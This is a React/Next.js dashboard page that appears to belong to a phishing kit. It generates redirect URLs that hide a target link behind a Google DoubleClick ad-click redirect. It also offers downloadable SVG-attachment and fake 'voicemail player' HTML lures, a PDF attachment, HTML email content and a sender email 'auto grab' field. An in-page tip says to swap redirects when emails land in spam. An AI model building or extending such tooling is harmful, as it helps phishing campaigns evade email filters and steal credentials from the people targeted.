// src/app/dashboard/redirects/page.tsx
'use client';

import React, { useState } from 'react';
import DashboardLayout from '@/components/DashboardLayout';
import { Copy, Upload, Mic, Zap } from 'lucide-react';

export default function RedirectsPage() {
  const [frontEndLink, setFrontEndLink] = useState(' ');
  const [senderEmailFormat, setSenderEmailFormat] = useState(' ');
  const [linkType, setLinkType] = useState('Un-shortened');
  const [generatedUrls, setGeneratedUrls] = useState<string[]>([]);

  const handleGenerate = () => {
    // In a real application, this would involve an API call to your backend
    // to generate the actual redirect URLs based on the input.
    // For now, we'll simulate some dummy URLs.
    const encodedFrontEndLink = encodeURIComponent(frontEndLink);

    const dummyUrls = [
      `https://googleads.g.doubleclick.net/pcs/click?xai=2AtHp7SIBq9Uf7bZ&sig=HTQIzEP9DNQj[?]CYD&adurl=${encodedFrontEndLink}`,
      `AMAZON AWS REDIRECT (COMING SOON)`,
      `CLOUDFRONT REDIRECT (COMING SOON)`,
    ];
    setGeneratedUrls(dummyUrls);
  };

  const handleCopyAll = () => {
    navigator.clipboard.writeText(generatedUrls.join('\n'));
    alert('All URLs copied to clipboard!');
  };

  const handleCopyUrl = async (url: string) => {
  try {
    await navigator.clipboard.writeText(url);
    alert('URL copied to clipboard!'); // You can replace this with a more sophisticated notification
  } catch (err) {
    console.error('Failed to copy URL: ', err);
    alert('Failed to copy URL.');
  }
};

  const handleSvgAttachment = (originalRedirectUrl: string) => {
    // Encode the original redirect URL to be safely passed as a query parameter
    const encodedRedirectUrl = encodeURIComponent(originalRedirectUrl);
    // Construct the URL to your new API endpoint
    const downloadSvgUrl = `/api/download-svg?to=${encodedRedirectUrl}`;

    // Create a temporary link element to trigger the download
    const link = document.createElement('a');
    link.href = downloadSvgUrl;
    link.download = 'attachment_redirect.svg'; // Suggest a filename for the download
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleVoicemail = (originalRedirectUrl: string) => {
    // Encode the original redirect URL to be safely passed as a query parameter
    const encodedRedirectUrl = encodeURIComponent(originalRedirectUrl);
    // Construct the URL to your new API endpoint
    const downloadVoicemailUrl = `/api/download-voicemail?to=${encodedRedirectUrl}`;

    // Create a temporary link element to trigger the download
    const link = document.createElement('a');
    link.href = downloadVoicemailUrl;
    link.download = 'voicemail_player.html'; // Suggest a filename for the download
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <DashboardLayout>
      <div className="min-h-screen bg-gray-50 p-8">
        <div className="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-md mb-6">
          <h1 className="text-2xl font-bold text-gray-900 mb-6">PDF + Attachment Format:</h1>
          <div className="flex flex-row gap-8">

          <a href="/Attachment.pdf" target="_blank">
                      <button
                        className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200 cursor-pointer"
                      >
                        PDF DOCUMENT
                      </button></a>
          <a
  href="/Letter.html"
  download="Letter.html"
>
  <button
    className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200 cursor-pointer"
  >
    HTML EMAIL CONTENT
  </button>
</a>

                      </div>
          </div>
        <div className="max-w-4xl mx-auto bg-white p-6 rounded-lg shadow-md">
          <h1 className="text-2xl font-bold text-gray-900 mb-6">Generate Redirect URLs</h1>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div>
              <label htmlFor="frontEndLink" className="block text-sm font-medium text-gray-700">
                Provide your link here:
              </label>
              <input
                type="text"
                id="frontEndLink"
                className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2"
                value={frontEndLink}
                onChange={(e) => setFrontEndLink(e.target.value)}
              />
            </div>
            <div>
              <label htmlFor="senderEmailFormat" className="block text-sm font-medium text-gray-700">
                Sender Auto Grab Email Format:
              </label>
              <input
                type="email"
                id="senderEmailFormat"
                className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2"
                value={senderEmailFormat}
                onChange={(e) => setSenderEmailFormat(e.target.value)}
              />
            </div>
          </div>

          <div className="mb-8">
            <label htmlFor="linkType" className="block text-sm font-medium text-gray-700">
              Link type:
            </label>
            <select
              id="linkType"
              className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2"
              value={linkType}
              onChange={(e) => setLinkType(e.target.value)}
            >
              <option>Un-shortened</option>
              {/* Add more options here if needed */}
            </select>
          </div>

          <button
            onClick={handleGenerate}
            className="flex items-center px-4 py-2 bg-blue-600 text-white font-semibold rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 mb-8"
          >
            <Zap size={20} className="mr-2" /> Generate
          </button>

          {generatedUrls.length > 0 && (
            <div className="mt-8 border-t border-gray-200 pt-8">
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-xl font-bold text-gray-900">Generated Redirect URLs</h2>
                <button
                  onClick={handleCopyAll}
                  className="flex items-center px-3 py-1 bg-gray-200 text-gray-700 text-sm font-medium rounded-md hover:bg-gray-300"
                >
                  <Copy size={16} className="mr-1" /> Copy
                </button>
              </div>

              <div className="bg-blue-50 border-l-4 border-blue-400 text-blue-700 p-4 mb-6" role="alert">
                <p className="text-sm">
                  If your email lands in spam, the redirect link might be detected, not always the attachment. Try using a different redirect from below to fix this.
                </p>
              </div>

              <div className="divide-y divide-gray-200">
                {generatedUrls.map((url, index) => (
                  <div key={index} className="py-4 flex justify-between items-center">
                    <a href={url} target='_blank' className="text-sm underline text-blue-600 font-bold break-all pr-4">
                        {url}
                    </a>
                    <div className="flex space-x-2 flex-shrink-0">
                      <button
                        onClick={() => handleSvgAttachment(url)}
                        className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200"
                      >
                        <Upload size={14} className="mr-1" /> SVG Attachment
                      </button>
                      <button
                        onClick={() => handleVoicemail(url)}
                        className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200"
                      >
                        <Mic size={14} className="mr-1" /> Voicemail
                      </button>
                      <button
                        onClick={() => handleCopyUrl(url)} // New copy button
                        className="flex items-center px-3 py-1 bg-gray-100 text-gray-700 text-sm rounded-md border border-gray-300 hover:bg-gray-200"
                      >
                        <Copy size={14} className="mr-1" /> Copy
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>
    </DashboardLayout>
  );
}